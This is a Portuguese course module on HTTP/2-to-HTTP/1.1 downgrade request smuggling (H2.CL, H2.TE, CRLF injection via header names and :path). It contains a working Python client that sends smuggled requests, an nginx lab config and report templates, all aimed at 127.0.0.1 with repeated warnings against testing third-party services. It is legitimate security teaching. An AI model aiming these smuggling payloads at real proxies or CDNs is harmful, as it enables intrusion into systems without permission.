# Módulo 6 — HTTP/2 e o Descenso

**Carga:** 4 horas (1h30 teoria · 2h30 lab)
**Pré-requisitos:** Módulos 1 a 5

---

## ⚠ Este é o módulo da variante moderna

⚠ **A afirmação que organiza tudo:**

> **HTTP/2 não tem smuggling.** **A mensagem é fatiada em frames com tamanho explícito** — **não há
> limite a inferir.** **Mas quase todo servidor HTTP/2 fala HTTP/1.1 com o backend** — **e é na
> CONVERSÃO que a divergência nasce.**

⚠ **E é o que o PortSwigger Research mostrou em 2021, e o que continua rendendo:** **o proxy
**traduz** H2 para H1** — **e a tradução inventa headers que o cliente H2 nunca mandou.**

⚠ **A tese:**

> **O H2 não tem âmbiguidade de framing; ele tem uma **camada de tradução**.** **E uma camada de
> tradução é uma camada a mais para discordar.**

⚠ **A tabela do que a conversão faz:**

| O que o cliente H2 manda | O que o proxy escreve em H1 |
|---|---|
| Header normal | Header normal |
| ⚠ Header com nome **inválido** em H1 | ⚠ **Rejeitado** ou **reescrito** |
| ⚠ Nome com **maiúscula** | ⚠ **Minúsculas** (H2 exige) |
| ⚠ **`:path`** pseudo-header | ⚠ **A linha de requisição** |
| ⚠ `transfer-encoding: chunked` | ⚠ **Pode repassar** |

⚠ **A última linha é o núcleo do **H2.CL** e do **H2.TE**.** **O H2 proíbe o `Transfer-Encoding`** —
**e um proxy tolerante que o reconhece e o **converte** para H1 pode entregar um `TE` que o backend
respeita** — **enquanto o proxy contou os bytes pelo frame.**

⚠ **A segunda linha é a mais sutil:** **um nome de header com caractere inválido em H1** — **um
`\r\n` embutido, um espaço** — **é **rejeitado** pelo H2** — **e um proxy que o aceita cria um
header novo em H1.** **É o **CRLF injection** na conversão.**

⚠ **A regra escrita:**

> **O H2 é seguro por construção; a ponte não é.** **E toda ponte H2→H1 é uma superfície nova.**

```bash
mkdir -p ~/smuggle-lab/mod06 && cd ~/smuggle-lab/mod06

echo "═══ 1. por que o H2 é diferente ═══"
echo
cat > h2.md <<'EOF'
# Por que o H2 é diferente

## O H1
⚠ o limite da mensagem é INFERIDO (CL ou TE).
→ o limite é uma APOSTA.

## O H2
✓ a mensagem é fatiada em FRAMES com tamanho EXPLÍCITO.
→ ⚠ **não há limite a inferir.**

## MAS — a ponte
⚠ quase todo servidor H2 fala H1 com o backend.
→ ⚠ e é na CONVERSÃO que a divergência nasce.

## O que a conversão faz
| O cliente H2 manda | O proxy escreve em H1 |
|---|---|
| header normal | header normal |
| ⚠ nome com char inválido em H1 | ⚠ REJEITADO ou REESCRITO |
| ⚠ nome com MAIÚSCULA | ⚠ minúsculas |
| ⚠ `:path` pseudo-header | ⚠ a linha de requisição |
| ⚠ `transfer-encoding: chunked` | ⚠ PODE REPASSAR |

## ⚠ as duas linhas que rendem
· `transfer-encoding` → H2.CL e H2.TE
· nome com CRLF embutido → CRLF injection na conversão

## ⚠ A REGRA
o H2 é seguro POR CONSTRUÇÃO. a ponte NÃO É.
e toda ponte H2→H1 é uma superfície NOVA.
EOF

cat h2.md

echo
echo "═══ 2. o que o H2 proíbe — e o que a ponte tolera ═══"
echo
cat <<'EXPL'
  ── O QUE O H2 PROÍBE (RFC 9113) ──
     · nomes de header com MAIÚSCULA
     · o campo Connection
     · ⚠ **o campo Transfer-Encoding**
     · o campo Keep-Alive, Proxy-Connection, Upgrade
     · ⚠ **qualquer caractere inválido no nome**

  ── E O QUE UM PROXY TOLERANTE FAZ ──
     ⚠ ele ACEITA o que a spec proíbe — e o CONVERTE.

     · `transfer-encoding: chunked` no H2
        → o proxy reconhece
        → ⚠ e o escreve no H1 ao backend
        → ⚠ o backend lê como chunked

     · um nome de header com `\r\n` embutido
        → o H2 exige rejeitar
        → ⚠ o proxy tolerante aceita e escreve em H1
        → ⚠ o CRLF vira o INÍCIO DE UMA NOVA LINHA

  ✓ e é exatamente aí que a variante vive.
EXPL
```

⚠ **A lista do que o H2 proíbe é o mapa.** **E cada item proibido é uma variante em potencial** —
**porque a proibição existe no lado do cliente, e a tolerância no lado do proxy.**

⚠ **E a nota do CRLF é a mais direta:** **o H2 rejeita o nome com `\r\n`; o proxy tolerante o
aceita** — **e em H1 o `\r\n` termina a linha do header.** **É a injeção, na conversão.**

**Produza `h2.md`:**

| O cliente H2 manda | O proxy escreve em H1 |
|---|---|
| Nome com maiúscula | |
| `transfer-encoding` | |
| Nome com `\r\n` | |

**Responda:**

1. **Por que o H2 não tem smuggling?**
2. **O que a ponte H2→H1 cria?**
3. **Cite quatro coisas que o H2 proíbe.**
4. **Por que a proibição vira variante?**

---

## 6.1 O descenso — H2.CL e H2.TE

⚠ **Duas variantes, e o mecanismo é a conversão.**

⚠ **H2.CL — o cliente mente no `content-length` do H2:**

| Lado | O que faz |
|---|---|
| **Cliente H2** | manda um frame com `content-length: 0` e um corpo |
| **Proxy** | ⚠ confia no `content-length` do H2 |
| **Backend H1** | ⚠ recebe o `CL` convertido e o corpo inteiro |

⚠ **O ponto:** **no H2, o tamanho do corpo vem do **frame**, não do header** — **mas o proxy
**converte** o header para H1.** **E em H1, o header manda.** **As duas contagens divergem.**

⚠ **H2.TE — o cliente manda `transfer-encoding: chunked` no H2:**

| Lado | O que faz |
|---|---|
| **Cliente H2** | manda `te: chunked` (⚠ proibido pelo H2) |
| **Proxy tolerante** | ⚠ aceita e converte para H1 |
| **Backend H1** | ⚠ lê em chunks — e o limite é o chunk 0 |

⚠ **O ponto:** **o cliente H2 não pode usar chunked** — **mas um proxy tolerante o **traduz** para
H1** — **e em H1 o chunked muda o limite.** **A divergência nasce da tradução, não do cliente.**

⚠ **A tabela das duas, com o que cada uma explora:**

| Variante | O cliente explora | ⚠ O que o proxy faz |
|---|---|---|
| **H2.CL** | o `content-length` no H2 | Confia nele e o converte |
| **H2.TE** | o `transfer-encoding` proibido | Aceita e o converte |
| **CRLF** | o nome do header | Aceita e escreve em H1 |
| ⚠ **H2 → H1 smuggling** | ⚠ **o pseudo-header `:path`** | O escreve na linha de requisição |

⚠ **A regra escrita:**

> **Você não manda um H1 malformado; você manda um H2 válido** — **e deixa o proxy produzir o H1
> malformado.** **A malformação nasce na tradução.**

```bash
cd ~/smuggle-lab/mod06

echo "═══ 3. H2.CL e H2.TE ═══"
echo
cat > h2-cl-te.md <<'EOF'
# H2.CL e H2.TE

## H2.CL
| Lado | O que faz |
|---|---|
| cliente H2 | manda `content-length: 0` e um CORPO |
| proxy | ⚠ confia no `content-length` do H2 |
| backend H1 | ⚠ recebe o CL convertido + o corpo inteiro |

⚠ no H2, o tamanho vem do FRAME, não do header.
   mas o proxy CONVERTE o header para H1.
   e em H1 o header MANDA.
✓ as duas contagens divergem.

## H2.TE
| Lado | O que faz |
|---|---|
| cliente H2 | manda `te: chunked` (⚠ PROIBIDO no H2) |
| proxy TOLERANTE | aceita e converte para H1 |
| backend H1 | ⚠ lê em chunks — o limite é o chunk 0 |

⚠ o cliente H2 NÃO pode usar chunked.
   mas o proxy o TRADUZ para H1.
✓ a divergência nasce da TRADUÇÃO.

## O que cada uma explora
| Variante | O cliente explora | O proxy faz |
|---|---|---|
| H2.CL | o content-length no H2 | confia e converte |
| H2.TE | o transfer-encoding proibido | aceita e converte |
| CRLF | o nome do header | aceita e escreve em H1 |
| ⚠ H2→H1 | ⚠ o pseudo-header `:path` | o escreve na linha |

## ⚠ A REGRA
você não manda um H1 MALFORMADO.
você manda um H2 VÁLIDO —
e deixa o proxy produzir o H1 malformado.
EOF

cat h2-cl-te.md

echo
echo "═══ 4. o descenso — o modelo ═══"
echo
cat <<'EXPL'
  ┌────────────────────────────────────────────────────────────────┐
  │ O CLIENTE FALA H2                                              │
  │                                                                │
  │   :method: POST                                                │
  │   :path: /                                                     │
  │   content-length: 0            ← ⚠ diz ZERO                   │
  │   ⚠ e o FRAME tem 60 bytes de corpo                            │
  │                                                                │
  ├────────────────────────────────────────────────────────────────┤
  │ O PROXY CONVERTE PARA H1                                       │
  │                                                                │
  │   POST / HTTP/1.1                                              │
  │   Content-Length: 0            ← ⚠ converteu o header          │
  │   ⚠ e escreve os 60 bytes do frame como corpo                  │
  │                                                                │
  ├────────────────────────────────────────────────────────────────┤
  │ O BACKEND LÊ H1                                                │
  │                                                                │
  │   ⚠ CL=0 → NÃO LÊ CORPO                                        │
  │   → os 60 bytes ficam no socket                                │
  │   → ⚠ e são a PRÓXIMA REQUISIÇÃO                               │
  │                                                                │
  └────────────────────────────────────────────────────────────────┘

  ✓ é o CL.0, produzido pela CONVERSÃO.
     ⚠ o cliente não fez nada de errado. mandou H2 válido.
EXPL
```

⚠ **A figura é o coração do módulo.** **E a nota final é a conclusão:** **é o `CL.0` do módulo 3 —
produzido pela **conversão**.** **O cliente mandou H2 válido; o proxy fabricou o H1 divergente.**

⚠ **E é por isso que a variante é moderna e perigosa:** **o H2 é considerado "seguro"** — **e a
superfície está na ponte, que ninguém testa como par.**

**Produza `descenso.md`:**

| Passo | O que acontece |
|---|---|
| Cliente H2 | |
| Proxy converte | |
| Backend lê | |

**Responda:**

1. **Por que o cliente H2 não faz nada de errado?**
2. **O que o proxy converte?** O que ele não devia?
3. **O resultado é qual variante do módulo 3?**
4. **Por que a ponte é a superfície?**

---

## 6.2 Medindo o descenso

⚠ **A medição exige três coisas, e a terceira é o que quase todos esquecem.**

| # | Requisito | Por quê |
|---|---|---|
| 1 | **Cliente H2** | `h2` em Python, ou Burp |
| 2 | **Proxy que converte** | nginx com `proxy_http_version 1.1` |
| 3 | ⚠ **Backend que loga o H1** | ⚠ **É onde o descenso aparece** |

⚠ **A terceira linha é o instrumento.** **Você não vê o H2 malformado** — **você vê o **H1 gerado
pelo proxy**.** **E é o log do backend H1 que o mostra.**

⚠ **A tabela do que o cliente H2 pode mandar, e o que o H1 mostra:**

| O cliente H2 manda | ⚠ O backend H1 vê |
|---|---|
| `content-length: 0` + corpo no frame | `Content-Length: 0` + corpo no socket |
| `transfer-encoding: chunked` | `Transfer-Encoding: chunked` |
| Nome com `\r\n` | ⚠ **Duas linhas de header** |
| `:path: /a\r\nX:` | ⚠ **Header novo ou linha de requisição** |

⚠ **A última linha é a injeção na conversão.** **O `:path` do H2 se torna a **linha de requisição**
do H1** — **e um `\r\n` nele injeta uma linha.**

⚠ **E a tabela do que testar, e o que NÃO testar:**

| Testável | Como |
|---|---|
| ✓ H2.CL local | Cliente `h2` → seu proxy → seu backend |
| ✓ H2.TE local | Idem |
| ✓ CRLF no nome | Idem |
| ⚠ **Testar CDN de terceiro** | ⚠ **CRIME** |

⚠ **A última linha precisa ser dita de novo, porque é aqui que a tentação aparece.** **A variante
H2→H1 é famosa em CDNs** — **e o artigo descreve CDNs de terceiro.** **Você reproduz o **mecanismo**,
com um nginx seu.**

⚠ **A regra escrita:**

> **O descenso se mede do lado H1.** **Você manda H2 e lê H1** — **e o header que você nunca mandou
> é a prova.**

```bash
cd ~/smuggle-lab/mod06

echo "═══ 5. medindo o descenso ═══"
echo
cat > mede-descenso.md <<'EOF'
# Medindo o descenso

## Os três requisitos
| # | Requisito | Por quê |
|---|---|---|
| 1 | cliente H2 | `h2` em python, ou Burp |
| 2 | proxy que converte | nginx com proxy_http_version 1.1 |
| 3 | ⚠ BACKEND que loga o H1 | ⚠ **é onde o descenso aparece** |

## O que o cliente manda × o que o H1 mostra
| O cliente H2 manda | ⚠ o backend H1 vê |
|---|---|
| `content-length: 0` + corpo no frame | CL: 0 + corpo no socket |
| `transfer-encoding: chunked` | Transfer-Encoding: chunked |
| nome com `\r\n` | ⚠ DUAS linhas de header |
| `:path: /a\r\nX:` | ⚠ header novo ou linha de requisição |

## ⚠ o instrumento
você não vê o H2 malformado.
você vê o **H1 GERADO PELO PROXY**.
✓ e é o log do backend H1 que o mostra.

## O que testar, e o que NÃO
| Testável | Como |
|---|---|
| H2.CL local | cliente h2 → seu proxy → seu backend |
| H2.TE local | idem |
| CRLF no nome | idem |
| ⚠ CDN de terceiro | ⚠ **CRIME** |

## ⚠ A REGRA
o descenso se mede DO LADO H1.
você manda H2 e lê H1 —
e o header que você NUNCA MANDOU é a prova.
EOF

cat mede-descenso.md

echo
echo "═══ 6. o cliente H2 didático ═══"
echo
cat > cliente-h2.py <<'PY'
#!/usr/bin/env python3
"""
cliente-h2.py — manda um H2 e observa o que o proxy gera em H1.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
   usa o h2 em modo "raw" para mandar headers fora do padrão.
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8082
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend-h1.log")

# ─── o corpo que contém o pedido escondido ───
MARCA = "H2SMUG"
CORPO = f"GET /{MARCA} HTTP/1.1\r\nHost: l\r\n\r\n".encode()


def envia_h2(host: str, port: int, headers: list, corpo: bytes):
    """
    ⚠ manda um H2 cru, com os headers que quisermos.
       sem validar — porque é o PROXY que valida (ou não).
    """
    try:
        import h2.connection, h2.config, h2.events
    except ImportError:
        print("  ⚠ o pacote h2 não está instalado:  pip3 install h2")
        return None, None

    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()

    try:
        with socket.create_connection((host, port), timeout=5) as s:
            s.sendall(conn.data_to_send())
            time.sleep(0.3)
            try: s.recv(8192)
            except socket.timeout: pass

            # ⚠ os headers — incluindo os PROIBIDOS pelo H2
            conn.send_headers(1, headers, end_stream=(not corpo))
            if corpo:
                conn.send_data(1, corpo, end_stream=True)
            s.sendall(conn.data_to_send())

            s.settimeout(3)
            resp = b""
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    resp += d
            except socket.timeout:
                pass
        return "enviado", resp
    except Exception as e:
        return f"({type(e).__name__})", b""


def conta_log():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def main():
    print("═══ CLIENTE H2 — DESCENSO ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}   ⚠ LOCAL")
    print(f"  log : {LOG}")
    print()

    casos = [
        ("H2.CL (content-length: 0 + corpo)", [
            (":method", "POST"), (":path", "/"), (":scheme", "http"),
            (":authority", "localhost"), ("content-length", "0"),
        ], CORPO),
        ("H2.TE (transfer-encoding proibido)", [
            (":method", "POST"), (":path", "/"), (":scheme", "http"),
            (":authority", "localhost"), ("transfer-encoding", "chunked"),
        ], b"0\r\n\r\n" + CORPO),
    ]

    for nome, headers, corpo in casos:
        print(f"  ── {nome} ──")
        antes, _ = conta_log()
        status, resp = envia_h2(HOST, PORT, headers, corpo)
        time.sleep(0.4)
        depois, txt = conta_log()
        print(f"     envio : {status}")
        print(f"     backend viu: {depois - antes} nova(s)")
        if MARCA in txt:
            print(f"     ⚠⚠ a marca APARECEU no H1 — DESCENSO CONFIRMADO")
        else:
            print(f"     · a marca não apareceu")
        print()

    print("  ⚠ tudo local. nenhum CDN, nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x cliente-h2.py

echo "  ── o cliente H2 está pronto ──"
echo
echo "  ── ⚠ E O PROXY PRECISA FALAR H2 NA FRENTE E H1 ATRÁS ──"
cat > nginx-h2.conf <<'EOF'
# ⚠ LABORATÓRIO. escuta em 127.0.0.1.
server {
    # ⚠ H2 na FRENTE, com TLS (o H2 em claro é "h2c", menos comum)
    listen 127.0.0.1:8443 ssl http2;

    # o certificado do SEU lab (self-signed)
    ssl_certificate     /etc/nginx/ssl/lab.crt;
    ssl_certificate_key /etc/nginx/ssl/lab.key;

    # ⚠ A PONTE: ele fala H1.1 com o backend
    proxy_http_version 1.1;

    # ⚠ deixe explícito o que ele faz com o encoding
    chunked_transfer_encoding on;

    location / {
        proxy_pass http://127.0.0.1:8090;
    }
}
EOF

cat nginx-h2.conf
```

⚠ **O cliente H2 é o instrumento do módulo.** **E ele manda headers que o H2 **proíbe** — porque é
o proxy que valida, ou não.**

⚠ **E a config do nginx mostra a ponte:** **H2 na frente, H1 atrás.** **E `chunked_transfer_encoding
on` — a diretiva que decide se ele reencoda.**

**Produza `cliente-h2.md`:**

| Item | Valor |
|---|---|
| Porta H2 | |
| Porta H1 | |
| `chunked_transfer_encoding` | |
| Log do backend | |

**Responda:**

1. **Qual a versão na frente?** E atrás?
2. **Por que o cliente H2 manda headers proibidos?
3. **Onde o descenso aparece?**
4. **O alvo é local?** Confirme.

---

## 6.3 LAB — O descenso

**Duração:** 150 min

### Passo 1 — Monte a ponte H2→H1 (50 min)

⚠ **TLS com certificado próprio, e o backend que loga.**

```bash
cd ~/smuggle-lab/mod06

echo "═══ MONTANDO A PONTE ═══"
echo
cat <<'EXPL'
  ── O QUE VOCÊ PRECISA ──

     1. H2 na frente (nginx com http2 + TLS)
     2. ⚠ H1 atrás (proxy_http_version 1.1)
     3. o backend que LOGA o H1

  ── O CERTIFICADO (do SEU lab) ──
     sudo mkdir -p /etc/nginx/ssl
     sudo openssl req -x509 -newkey rsa:2048 -nodes -days 30 \
       -keyout /etc/nginx/ssl/lab.key \
       -out /etc/nginx/ssl/lab.crt \
       -subj "/CN=localhost"

     ⚠ self-signed, só para o lab.

  ── E O BACKEND ──
     ⚠ ajuste o backend_cl.py para logar em backend-h1.log,
        ou crie um segundo:
     python3 ~/smuggle-lab/backends/backend_cl.py 8090

  ── O TESTE DE ISOLAMENTO ──
     ⚠ escuta só em 127.0.0.1 — confira com:
     grep -n 'listen' nginx-h2.conf
EXPL

# ajusta o log do backend para o H1
sed 's|backend-cl.log|backend-h1.log|' ~/smuggle-lab/backends/backend_cl.py \
    > ~/smuggle-lab/backends/backend_h1.py 2>/dev/null && \
    chmod +x ~/smuggle-lab/backends/backend_h1.py

echo "  ── o backend do H1 está pronto ──"
ls -1 ~/smuggle-lab/backends/*.py 2>/dev/null | sed 's/^/     /'
echo
echo "═══ E O QUE O LOG VAI MOSTRAR ═══"
cat <<'EXPL'
  ⚠ o log do backend H1 é o INSTRUMENTO.
     ele mostra a PRIMEIRA_LINHA e os HEADERS que ele recebeu.

     ── se o descenso ocorreu, você verá ──
        · a MARCA (H2SMUG) em um PATH que você não pediu
        · ou uma requisição a MAIS
        · ou um header que você NUNCA mandou no H2
     ✓ e é isso a prova.
EXPL
```

⚠ **O log do backend H1 é o instrumento.** **E a lista do que procurar é concreta:** **a marca no
path, a requisição a mais, o header que ninguém mandou.**

⚠ **E a nota do header que ninguém mandou é o achado mais forte do módulo** — **porque significa
que o **proxy** o criou.**

**Produza `ponte.md`:**

| Item | Valor |
|---|---|
| H2 na frente | |
| H1 atrás | |
| Certificado | |
| Backend log | |

**Responda:**

1. **A ponte está montada?**
2. **O certificado é do lab?** (self-signed)
3. **O que o log do H1 vai mostrar?**
4. **O que é o achado mais forte do módulo?**

### Passo 2 — Rode o cliente H2 (55 min)

```bash
cd ~/smuggle-lab

echo "═══ RODANDO O DESCENSO ═══"
echo
cat <<'EXPL'
  ── COM A PONTE NO AR ──

     aponte o cliente H2 para a porta TLS (8443):
     python3 ~/smuggle-lab/mod06/cliente-h2.py 8443

     ⚠ o cliente usa TLS? se não, ele precisa negociar.
        ajuste o script para usar ssl, ou use h2c (sem TLS).

  ── E O LOG, QUE É A MEDIDA ──
     tail -f ~/smuggle-lab/evidencia/backend-h1.log
EXPL

echo
echo "═══ E SE VOCÊ PREFERIR SEM TLS (h2c) ═══"
cat <<'EXPL'
  ⚠ o H2 em claro (h2c) é mais simples para o lab:
     · no nginx, troque `ssl http2` por `http2` simples
       (precisa de nginx com suporte a h2c)
     · ou use um proxy em Python que fale H2 na frente

     ✓ e o mecanismo é o MESMO: a ponte H2→H1.
EXPL

cat > caderno/PD-006.md <<'EOF'
# PD-006 — descenso H2 → H1

**Data:** ____

## 1. A ponte
| Camada | Protocolo | Porta |
|---|---|---|
| cliente | H2 | — |
| frontend | ⚠ H2 na frente | |
| backend | ⚠ H1 atrás | |

## 2. A config
| Diretiva | Valor |
|---|---|
| http2 | |
| proxy_http_version | |
| chunked_transfer_encoding | |

## 3. Os casos
| # | O cliente manda | Backend viu | Marca apareceu | ⚠ SAÍDA |
|---|---|---|---|---|
| 1 | `content-length: 0` + corpo | | | |
| 2 | `transfer-encoding: chunked` | | | |
| 3 | nome com `\r\n` | | | |
| 4 | normal (controle) | | | |

## 4. ⚠ O header que eu NUNCA mandei
| Item | Valor |
|---|---|
| Apareceu algum? | |
| Qual | |
| ⚠ o proxy o CRIOU | |

## 5. Os três níveis (Parser Differentials, módulo 6)
| Nível | Resposta |
|---|---|
| 1 — o que discorda | |
| 2 — por que importa | |
| 3 — ⚠ o invariante | |

## 6. A evidência literal
```
[H2 enviado]
```
```
[H1 recebido]
```

## 7. A classificação
| Item | Valor |
|---|---|
| Categoria (Parser Differentials, módulo 3) | |
| Destinatário | o proxy / o backend |

## 8. ⚠ O que eu NÃO fiz
- [ ] não apontei para CDN de terceiro
- [ ] não testei serviço público
- [ ] não usei o descenso para acessar nada
- [ ] não publiquei nada

## 9. O que NÃO foi verificado
⚠ mínimo 3
EOF

cat caderno/PD-006.md | head -30
```

⚠ **O caso 4 (controle) é obrigatório de novo.** **Sem o normal, você não sabe se o seu cliente H2
funciona** — **e um descenso "em tudo" é um bug no harness.**

⚠ **E a seção 4 é o achado mais forte:** **o header que você nunca mandou, e que o proxy criou.**

**Produza `descenso-medido.md`:**

| # | Cliente mandou | Backend viu | Saída |
|---|---|---|---|
| 1 | `content-length: 0` | | |
| 2 | `transfer-encoding` | | |
| 4 | normal | | |

**Responda:**

1. **Quantos casos deram descenso?**
2. **O controle concordou?**
3. **Apareceu algum header que você não mandou?**
4. **Qual o invariante violado?**

### Passo 3 — Documente a ponte (45 min)

Produza `relatorio-descenso.md`:

```markdown
# Relatório — descenso H2 → H1

## 1. A ponte
| Camada | Protocolo | Produto | Versão | Porta |
|---|---|---|---|---|
| cliente | H2 | | | — |
| frontend | H2 na frente | | | |
| backend | H1 atrás | | | |

## 2. A configuração (literal)
```
[as diretivas que importam]
```

## 3. O isolamento
| Item | Valor |
|---|---|
| endereços | 127.0.0.1 |
| ⚠ terceiros | NENHUM |
| teste que falha | [ ] feito |

## 4. O que o cliente mandou (H2)
```
[os headers, literais]
```

## 5. ⚠ O que o backend recebeu (H1)
```
[o log literal — a prova]
```

## 6. O header que eu nunca mandei
| Item | Valor |
|---|---|
| Apareceu? | |
| Qual | |
| ⚠ quem o criou | o PROXY, na conversão |

## 7. A medida
| Caso | Backend viu | Marca | Saída |
|---|---|---|---|
| | | | |

## 8. Os três níveis
| Nível | Resposta |
|---|---|
| 1 — o que discorda | |
| 2 — por que importa | |
| 3 — o invariante | |

## 9. A classificação e o destino
| Item | Valor |
|---|---|
| Categoria | |
| Destinatário | o proxy (a conversão) e o backend |

## 10. ⚠ O que eu NÃO fiz
- [ ] não apontei para CDN, WAF ou host de terceiro
- [ ] não testei serviço público
- [ ] não usei o descenso para acessar nada
- [ ] não publiquei
- [ ] não calculei severidade

## 11. O que NÃO foi verificado
⚠ mínimo 3

## 12. O que o mantenedor precisa confirmar
| # | Item |
|---|---|
| 1 | o proxy valida os headers proibidos pelo H2? |
| 2 | o backend confia no CL recebido? |
```

**Produza `relatorio-descenso.md`:**

| Item | Valor |
|---|---|
| Ponte | |
| Header criado | |
| Categoria | |
| Destinatários | |

**Responda:**

1. **O header criado pelo proxy está registrado?**
2. **Qual a categoria?** Quem corrige?
3. **O isolamento foi testado?**
4. **O que o mantenedor confirma?**

### Critérios de aceitação

- `h2.md` com o que o H2 proíbe e o que a ponte tolera.
- Você explicou **por que o H2 não tem smuggling**.
- Você explicou **o que a ponte cria**.
- `h2-cl-te.md` com as **duas** variantes e o que cada lado faz.
- Você explicou **por que o cliente H2 não faz nada de errado**.
- Você explicou **por que a divergência nasce da tradução**.
- `descenso.md` com o modelo dos **três** passos.
- Você identificou **qual variante do módulo 3** o descenso produz.
- `mede-descenso.md` com os **três** requisitos.
- Você explicou **por que se mede do lado H1**.
- Você explicou **o que é o achado mais forte**.
- A **ponte H2→H1** montada, com TLS ou h2c.
- O **log do backend H1** instrumentado.
- Os **quatro** casos rodados, incluindo o **controle**.
- Você verificou **se apareceu header que você não mandou**.
- `caderno/PD-006.md` com as **nove** seções.
- Você aplicou os **três níveis** ao descenso.
- Você escreveu **o invariante violado**.
- `relatorio-descenso.md` com as **doze** seções.
- Você identificou **quem cria o header** na conversão.
- ⚠ **Nenhum CDN ou serviço público.** Tudo em 127.0.0.1.

---

## Avaliação

1. **Por que o H2 não tem smuggling?**
2. **O que torna a ponte H2→H1 uma superfície?**
3. **Cite quatro coisas que o H2 proíbe.**
4. **Por que a proibição vira variante?**
5. **O que é o H2.CL?** Descreva os três lados.
6. **O que é o H2.TE?**
7. **Por que o cliente H2 não faz nada de errado**?
8. **O que o proxy faz que cria a divergência?**
9. **Qual variante do módulo 3 o descenso produz?** Por quê?
10. **O que o CRLF no nome explora?**
11. **Cite os três requisitos** para medir o descenso.
12. **Por que se mede do lado H1?**
13. **O que o `:path` pode virar** no H1?
14. **Por que o cliente H2 manda headers proibidos?
15. **O que o log do backend revela?**
16. **Qual é o achado mais forte do módulo?** Por quê?
17. **Por que o controle é obrigatório?**
18. **Quem cria o header na conversão?**
19. **O que o proxy poderia fazer para ser imune?**
20. **Qual é a linha sobre CDNs de terceiro** neste módulo?

---

**Próximo:** [Módulo 7 — Client-side desync](modulo-07.md)
